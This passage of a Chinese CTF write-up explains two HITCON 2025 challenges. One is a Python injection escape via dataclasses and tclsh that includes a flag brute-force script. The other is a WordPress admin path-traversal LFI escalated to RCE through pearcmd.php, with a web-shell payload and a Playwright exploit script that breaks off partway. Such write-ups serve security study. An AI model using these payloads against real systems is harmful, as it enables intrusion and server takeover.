<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) import os</span><br><span class="line">(Pdb) os.popen(&#x27;ls&#x27;).read()</span><br><span class="line">&#x27;&#x27;</span><br><span class="line">(Pdb) os.popen(&#x27;ls /home&#x27;).read()</span><br><span class="line">&#x27;ctf\n&#x27;</span><br><span class="line">(Pdb) os.popen(&#x27;ls /home/ctf&#x27;).read()</span><br><span class="line">&#x27;chal.py\nexp.py\nexp1.py\nflag\nrun.sh\n&#x27;</span><br><span class="line">(Pdb) os.popen(&#x27;cat /home/ctf/flag&#x27;).read()</span><br><span class="line">&#x27;flag&#123;fake&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>好简洁的payload，AI分析一下</p>
<ol>
<li><code>__import__(mod)</code> 会在设置属性前导入模块<br>也就是说，只要我们把 mod 写成某个标准库模块名，这一行就会执行它的导入流程（含顶层代码）。</li>
<li><code>value</code> 是字符串，但可以包含控制字符<br>由于是用 <code>split(&#39; &#39;)</code>（只按空格分割），因此我们可以把 <code>\r</code>（回车）、<code>\t</code>（制表符）等字符塞进 <code>value</code>，不会被进一步拆分。这让我们能把多行代码片段塞进某些会用 <code>exec()</code> 拼接&#x2F;生成代码的模块模板里。</li>
<li>可写模块私有常量<br>我们能随意 <code>setattr(模块, 名称, 字符串)</code>，哪怕是该模块内部使用的私有常量（例如 <code>_SOMETHING</code>），从而污染模块的代码生成模板。</li>
</ol>
<p>为什么选 <code>dataclasses</code> 当注入点</p>
<p><code>dataclasses</code> 在实现中会通过字符串模板 + <code>exec()</code>动态生成 <code>__init__、__repr__、__setattr__</code> 等方法；这些模板里会引用若干内部常量（例如 <code>_FIELDS</code>、<code>_POST_INIT_NAME</code> 等）。<br>如果我们把这些常量改成包含换行和任意 Python 语句的字符串，那么下一次有模块调用 <code>@dataclass</code>（或相关构造）时，<code>dataclasses</code> 在 <code>exec()</code> 那段拼接后的代码时，就会把我们注入的语句一并执行。</p>
<p>因此第一步与第二步是：</p>
<p><strong>第 1 次发送</strong><br><code>dataclasses _FIELDS x\rbreakpoint()\rdef\tf():#</code><br><strong>第 2 次发送</strong><br><code>dataclasses _POST_INIT_NAME x\rbreakpoint()\rdef\tf():#</code></p>
<p>这两次把 dataclasses 的两个内部名字分别改成了带”换行 + 代码”的字符串：<br><code>x\rbreakpoint()\rdef\tf():#</code></p>
<p>其中 <code>\r</code>（回车）在源码拼接时等价于换行；<br><code>breakpoint()</code> 会调用默认的 <code>sys.breakpointhook</code>，即 <code>pdb.set_trace()</code>；</p>
<p>后面的 <code>def\tf():#</code>（也就是 <code>def f():#</code>）只是占位，避免代码拼接后语法结构断裂（保证 <code>exec</code> 时依旧是合法 Python 代码）。</p>
<p>到这一步，我们只是把”炸弹”放进了 <code>dataclasses</code> 的模板里，还没”引爆”。要想实际执行注入的 <code>breakpoint()</code>，必须让某个模块用到 <code>dataclasses</code> 去生成代码。</p>
<p>为什么第三步导入 <code>pstats</code> 就会”引爆”</p>
<p><strong>第 3 次发送</strong><br><code>pstats x x</code></p>
<p>别看它只是随手在 <code>pstats</code> 上塞个属性 x，重点是 <code>__import__(&#39;pstats&#39;)</code>：<br>在较新的 Python 版本里，<code>pstats</code>（以及其相关的统计条目&#x2F;记录结构）内部确实使用了 <code>@dataclass</code> 来定义若干数据结构。<br>因此当我们导入 <code>pstats</code> 时，它会在模块顶层或类定义处用到 <code>dataclasses</code> 来创建数据类，触发 <code>dataclasses</code> 的模板拼接 + <code>exec()</code>，进而把我们注入的 <code>breakpoint()</code> 一并执行，直接掉进 pdb。</p>
<p>也就是说，第三行是触发器：先污染 <code>dataclasses</code>，再导入一个会用 <code>dataclasses</code> 生成代码的模块（这里选择的是标准库 <code>pstats</code>，稳定可用），从而把我们送进调试器。</p>
<p>还有一个比较笨重的方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">KNOWN_FLAG = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">charset = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;NEW POS&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:    </span><br><span class="line">        p = remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">48763</span>)</span><br><span class="line">        <span class="comment"># p = remote(&quot;simp.chal.hitconctf.com&quot;, 48763)</span></span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;sys argv ab&#x27;</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;sys _base_executable /bin/tclsh&#x27;</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(<span class="string">b&#x27;venv.__main__ meow meow&#x27;</span>)</span><br><span class="line">        guess = KNOWN_FLAG + c</span><br><span class="line">        guess = guess.replace(<span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;\\&#123;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;\\&#125;&quot;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\\&#x27;&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">f&#x27;set f [open &quot;/home/ctf/flag&quot; r]; set c [read $f <span class="subst">&#123;<span class="built_in">len</span>(KNOWN_FLAG)+<span class="number">1</span>&#125;</span>]; close $f; if &#123;&#123;$c eq &quot;<span class="subst">&#123;guess&#125;</span>&quot;&#125;&#125; &#123;&#123;exit&#125;&#125;&#x27;</span>.encode())</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recv(timeout=<span class="number">.75</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            KNOWN_FLAG += c</span><br><span class="line">            <span class="built_in">print</span>(KNOWN_FLAG)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p>看脚本的前几行 payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">b&#x27;sys argv ab&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;sys _base_executable /bin/tclsh&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;venv.__main__ meow meow&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这里有几个重要动作：</p>
<ol>
<li><code>sys.argv</code> 被改成 <code>&quot;ab&quot;</code><br>这影响到后续 Python 启动子进程或 <code>runpy</code> 时，<code>sys.argv</code> 会带上我们的参数。</li>
<li><code>sys._base_executable</code> 改成 <code>&quot;/bin/tclsh&quot;</code></li>
</ol>
<ul>
<li><code>sys._base_executable</code> 是 Python 里用来标记Python 解释器的路径的变量。</li>
<li>修改它之后，某些库（例如 <code>venv</code>）在运行时会根据它来调用解释器。</li>
<li>被我们篡改后，Python 认为解释器是 Tcl 解释器 <code>/bin/tclsh</code>。</li>
</ul>
<ol start="3">
<li>调用 <code>__import__(&#39;venv.__main__&#39;)</code></li>
</ol>
<ul>
<li>导入 <code>venv.__main__</code> 时，会触发 <code>venv</code> 内部逻辑，它会尝试用 <code>sys._base_executable</code> 作为解释器来执行一些初始化脚本。</li>
<li>因为我们把 <code>_base_executable</code> 改成了 <code>/bin/tclsh</code>，所以它会启动 Tcl 解释器而不是 Python 解释器。</li>
</ul>
<p>至此，Python 的执行环境被替换为 Tcl 解释器。也就是说，后面我们输入的东西就是 Tcl 脚本了。</p>
<p>接下来代码里发送的输入是：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">f&#x27;set f [open &quot;/home/ctf/flag&quot; r]; set c [read $f <span class="subst">&#123;<span class="built_in">len</span>(KNOWN_FLAG)+<span class="number">1</span>&#125;</span>]; close $f; if &#123;&#123;$c eq &quot;<span class="subst">&#123;guess&#125;</span>&quot;&#125;&#125; &#123;&#123;exit&#125;&#125;&#x27;</span>.encode())</span><br></pre></td></tr></table></figure>

<p>这是一段 合法的 Tcl 脚本：</p>
<ul>
<li><code>set f [open &quot;/home/ctf/flag&quot; r]</code>  打开 &#x2F;home&#x2F;ctf&#x2F;flag。</li>
<li><code>set c [read $f N]</code>  读取前 N 个字符。</li>
<li><code>close $f</code></li>
<li><code>if &#123;$c eq &quot;...&quot;&#125; &#123;exit&#125;</code><br>如果读到的内容等于我们猜测的前缀，就执行 <code>exit</code>（让进程正常退出）。</li>
</ul>
<p>后续就是逐字爆破泄露 flag</p>
<p>采用爆破法是因为没有直接把 flag 打印出来的通路（Tcl 输出会和 socket 混在一起），所以用条件退出作为 side-channel 判定。</p>
<h2 id="wp-admin"><a href="#wp-admin" class="headerlink" title="wp-admin"></a>wp-admin</h2><p>给了进后台的账密，但是 WordPress 文件夹设置为只读。</p>
<p>从管理面板在 WordPress 上实现 RCE 的传统方法是使用主题或插件编辑器添加 Web shell。但是，在这种情况下，WordPress 文件夹是只读的，因此我们无法直接修改任何文件。</p>
<p>根据maple的讲解，攻击点在于wp-includes&#x2F;template-loader.php</p>
<p>它首先检查请求的帖子类型，并调用相应的函数来获取模板文件（PHP 文件）的路径。之后，返回的模板路径被包含，所以如果返回的模板路径可以控制，我们就可以实现LFI。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$template</span> = <span class="title function_ invoke__">apply_filters</span>( <span class="string">&#x27;template_include&#x27;</span>, <span class="variable">$template</span> );</span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$template</span> ) &#123;</span><br><span class="line">	<span class="keyword">include</span> <span class="variable">$template</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ( <span class="title function_ invoke__">current_user_can</span>( <span class="string">&#x27;switch_themes&#x27;</span> ) ) &#123;</span><br><span class="line">	<span class="variable">$theme</span> = <span class="title function_ invoke__">wp_get_theme</span>();</span><br><span class="line">	<span class="keyword">if</span> ( <span class="variable">$theme</span>-&gt;<span class="title function_ invoke__">errors</span>() ) &#123;</span><br><span class="line">		<span class="title function_ invoke__">wp_die</span>( <span class="variable">$theme</span>-&gt;<span class="title function_ invoke__">errors</span>() );</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在 WordPress 中，帖子不仅仅是一篇文章，还包括页面、附件和自定义帖子类型</p>
</blockquote>
<p>我们的目标是wp-includes&#x2F;template.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_single_template</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$object</span> = <span class="title function_ invoke__">get_queried_object</span>();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$templates</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( ! <span class="keyword">empty</span>( <span class="variable">$object</span>-&gt;post_type ) ) &#123;</span><br><span class="line">		<span class="variable">$template</span> = <span class="title function_ invoke__">get_page_template_slug</span>( <span class="variable">$object</span> );</span><br><span class="line">		<span class="keyword">if</span> ( <span class="variable">$template</span> &amp;&amp; <span class="number">0</span> === <span class="title function_ invoke__">validate_file</span>( <span class="variable">$template</span> ) ) &#123;</span><br><span class="line">			<span class="variable">$templates</span>[] = <span class="variable">$template</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$name_decoded</span> = <span class="title function_ invoke__">urldecode</span>( <span class="variable">$object</span>-&gt;post_name );</span><br><span class="line">		<span class="keyword">if</span> ( <span class="variable">$name_decoded</span> !== <span class="variable">$object</span>-&gt;post_name ) &#123;</span><br><span class="line">			<span class="variable">$templates</span>[] = <span class="string">&quot;single-<span class="subst">&#123;$object-&gt;post_type&#125;</span>-<span class="subst">&#123;$name_decoded&#125;</span>.php&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$templates</span>[] = <span class="string">&quot;single-<span class="subst">&#123;$object-&gt;post_type&#125;</span>-<span class="subst">&#123;$object-&gt;post_name&#125;</span>.php&quot;</span>;</span><br><span class="line">		<span class="variable">$templates</span>[] = <span class="string">&quot;single-<span class="subst">&#123;$object-&gt;post_type&#125;</span>.php&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$templates</span>[] = <span class="string">&#x27;single.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">get_query_template</span>( <span class="string">&#x27;single&#x27;</span>, <span class="variable">$templates</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然post_type无法控制，但post_name是可以控制的。post_name是帖子的slug，可以在管理面板中更改。<br><img src="/2025/08/24/HITCON-2025/3.png" alt="alt text"></p>
<p>但是，如果我们尝试将 &#x2F; 或 .. 放在slug中，会被清洗掉。幸运的是，get_single_template中的函数将解码 URL 编码字符，因此我们只需对路径遍历字符进行 URL 编码即可。所以现在，我们可以将模板路径的后缀控制为single-post-[SLUG].php</p>
<p>数组$templates被传递给get_query_template，后者调用locate_template以查找模板的完整路径。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">locate_template</span>(<span class="params"> <span class="variable">$template_names</span>, <span class="variable">$load</span> = <span class="literal">false</span>, <span class="variable">$load_once</span> = <span class="literal">true</span>, <span class="variable">$args</span> = <span class="keyword">array</span>(<span class="params"></span>) </span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$wp_stylesheet_path</span>, <span class="variable">$wp_template_path</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( ! <span class="keyword">isset</span>( <span class="variable">$wp_stylesheet_path</span> ) || ! <span class="keyword">isset</span>( <span class="variable">$wp_template_path</span> ) ) &#123;</span><br><span class="line">		<span class="title function_ invoke__">wp_set_template_globals</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$is_child_theme</span> = <span class="title function_ invoke__">is_child_theme</span>();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$located</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">foreach</span> ( (<span class="keyword">array</span>) <span class="variable">$template_names</span> <span class="keyword">as</span> <span class="variable">$template_name</span> ) &#123;</span><br><span class="line">		<span class="keyword">if</span> ( ! <span class="variable">$template_name</span> ) &#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ( <span class="title function_ invoke__">file_exists</span>( <span class="variable">$wp_stylesheet_path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$template_name</span> ) ) &#123;</span><br><span class="line">			<span class="variable">$located</span> = <span class="variable">$wp_stylesheet_path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$template_name</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125; <span class="keyword">elseif</span> ( <span class="variable">$is_child_theme</span> &amp;&amp; <span class="title function_ invoke__">file_exists</span>( <span class="variable">$wp_template_path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$template_name</span> ) ) &#123;</span><br><span class="line">			<span class="variable">$located</span> = <span class="variable">$wp_template_path</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$template_name</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125; <span class="keyword">elseif</span> ( <span class="title function_ invoke__">file_exists</span>( ABSPATH . WPINC . <span class="string">&#x27;/theme-compat/&#x27;</span> . <span class="variable">$template_name</span> ) ) &#123;</span><br><span class="line">			<span class="variable">$located</span> = ABSPATH . WPINC . <span class="string">&#x27;/theme-compat/&#x27;</span> . <span class="variable">$template_name</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( <span class="variable">$load</span> &amp;&amp; <span class="string">&#x27;&#x27;</span> !== <span class="variable">$located</span> ) &#123;</span><br><span class="line">		<span class="title function_ invoke__">load_template</span>( <span class="variable">$located</span>, <span class="variable">$load_once</span>, <span class="variable">$args</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$located</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数将检查模板文件是否存在于三个位置：</p>
<ol>
<li>$wp_stylesheet_path: 活动主题的路径。</li>
<li>$wp_template_path: 父主题的路径（如果使用子主题）。</li>
<li>ABSPATH.WPINC.’&#x2F;theme-compat&#x2F;‘: WordPress 核心文件中的后备目录。</li>
</ol>
<p>$wp_stylesheet_path 是样式表数据库中的选项，可以在 &#x2F;wp-admin&#x2F;options.php 中更改。因此，返回的完整模板路径为：<code>[THEME_PATH]/single-post-[SLUG].php</code></p>
<p>如果我们将 stylesheet 设置为 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp，将 slug 设置为 &#x2F;..&#x2F;..&#x2F;something，路径将是：<br><code>../../../../tmp/single-post-/../../something.php</code></p>
<p>这意味着如果文件夹 &#x2F;tmp&#x2F;single-post- 存在，我们可以在文件系统下包含任何以 .php 结尾的文件，从而实现 LFI。</p>
<p>但是我们如何创建文件夹 &#x2F;tmp&#x2F;single-post- 呢？这实际上很容易，只需更改upload_path选项并上传附件即可。附件将存储在 [UPLOAD_PATH]&#x2F;[YEAR]&#x2F;[MONTH]&#x2F; 中，如果文件夹不存在，WordPress 将创建该文件夹。</p>
<p>因此，如果我们将upload_path设置为 &#x2F;tmp&#x2F;single-post-，那么当我们上传附件时，将创建该文件夹。</p>
<p><strong>LFI to RCE</strong></p>
<p>现在，我们基本上可以在服务器上包含任何 PHP 文件，如何从中弹出一个 shell？<br>在 WordPress 容器中，我们可以发现众所周知的 PEAR LFI 到 RCE 技巧在这里也有效。<br><code>find / -name &#39;*.php&#39;</code> <code>/usr/local/lib/php/pearcmd.php</code></p>
<p>综上，完整的攻击流程如下</p>
<ol>
<li>确保至少存在两个帖子。</li>
<li>将第一个的 slug 更改为 <code>%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd</code>，将第二个的 slug 更改为 <code>%2f%2e%2e%2f%2e%2e%2ftmp%2fshell</code>，并记录它们的帖子 ID</li>
<li>将 stylesheet 选项更改为 ..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp</li>
<li>将 upload_path 选项更改为 &#x2F;tmp&#x2F;single-post-。</li>
<li>在某处上传附件以创建文件夹 &#x2F;tmp&#x2F;single-post-。</li>
<li>访问 <code>/?p=[PEARCMD_POST_ID]&amp;+config-create+/&lt;?system($_GET[0]);die();?&gt;+/tmp/shell.php</code> 将 Web shell 写入 &#x2F;tmp&#x2F;shell.php</li>
<li>访问 <code>/?p=[SHELL_POST_ID]&amp;0=/readflag</code> 获取flag</li>
</ol>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> playwright.async_api <span class="keyword">import</span> async_playwright</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">target: <span class="built_in">str</span>, cmd: <span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> async_playwright() <span class="keyword">as</span> p:</span><br><span class="line">        browser = <span class="keyword">await</span> p.chromium.launch(</span><br><span class="line">            executable_path=<span class="string">&quot;/usr/bin/chromium&quot;</span>, headless=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        page = <span class="keyword">await</span> browser.new_page()</span><br><span class="line">        <span class="comment"># install</span></span><br><span class="line">        <span class="keyword">await</span> page.goto(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># login</span></span><br><span class="line">        <span class="keyword">await</span> page.goto(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/wp-login.php&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> page.fill(<span class="string">&quot;#user_login&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> page.fill(<span class="string">&quot;#user_pass&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> page.click(<span class="string">&quot;#wp-submit&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> page.wait_for_url(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/wp-admin/&quot;</span>)</span><br><span class="line">        <span class="keyword">await</span> page.goto(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/wp-admin/edit.php&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># check if we have enough posts</span></span><br><span class="line">        rows = page.locator(<span class="string">&quot;#the-list tr&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">await</span> page.locator(<span class="string">&quot;#the-list tr&quot;</span>).count() &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># if not, create a post</span></span><br><span class="line">            <span class="keyword">await</span> page.goto(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/wp-admin/post-new.php&quot;</span>)</span><br><span class="line">            cls = page.locator(<span class="string">&#x27;button[aria-label=&quot;Close&quot;]&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">await</span> cls.count() &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">await</span> cls.click()</span><br><span class="line">            <span class="keyword">await</span> (</span><br><span class="line">                page.frame_locator(<span class="string">&#x27;iframe[name=&quot;editor-canvas&quot;]&#x27;</span>)</span><br><span class="line">                .locator(<span class="string">&quot;.wp-block-post-title&quot;</span>)</span><br><span class="line">                .fill(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">await</span> page.click(<span class="string">&#x27;.edit-post-header button:has-text(&quot;Publish&quot;)&#x27;</span>)</span><br><span class="line">            <span class="keyword">await</span> page.click(<span class="string">&#x27;.editor-post-publish-panel button:has-text(&quot;Publish&quot;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># now we should have enough posts</span></span><br><span class="line">        <span class="keyword">await</span> page.goto(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/wp-admin/edit.php&quot;</span>)</span><br><span class="line">        rows = page.locator(<span class="string">&quot;#the-list tr&quot;</span>)</span><br><span class="line">        <span class="keyword">assert</span> <span class="keyword">await</span> rows.count() &gt;= <span class="number">2</span>, <span class="string">&quot;wtf&quot;</span></span><br><span class="line">        <span class="comment"># change post slugs to pearcmd and shell</span></span><br><span class="line">        slugs = [</span><br><span class="line">            <span class="string">&quot;%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd&quot;</span>,</span><br><span class="line">            <span class="string">&quot;%2f%2e%2e%2f%2e%2e%2ftmp%2fshell&quot;</span>,</span><br><span class="line">        ]</span><br><span class="line">        ids = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">            tr = rows.nth(i)</span><br><span class="line">            title = tr.locator(<span class="string">&quot;a.row-title&quot;</span>)</span><br><span class="line">            url = <span class="keyword">await</span> title.get_attribute(<span class="string">&quot;href&quot;</span>)</span><br><span class="line">            <span class="keyword">await</span> tr.hover()</span><br><span class="line">            <span class="keyword">await</span> tr.locator(<span class="string">&#x27;button:has-text(&quot;Quick Edit&quot;)&#x27;</span>).click()</span><br><span class="line">            slug = page.locator(<span class="string">&#x27;#the-list input[name=&quot;post_name&quot;]&#x27;</span>)</span><br><span class="line">            <span class="keyword">await</span> slug.fill(slugs[i])</span><br><span class="line">            <span class="keyword">await</span> page.locator(<span class="string">&#x27;#the-list button:has-text(&quot;Update&quot;)&#x27;</span>).click()</span><br><span class="line">            post_id = <span class="built_in">int</span>(re.search(<span class="string">r&quot;post=(\d+)&quot;</span>, url).group(<span class="number">1</span>))</span><br><span class="line">            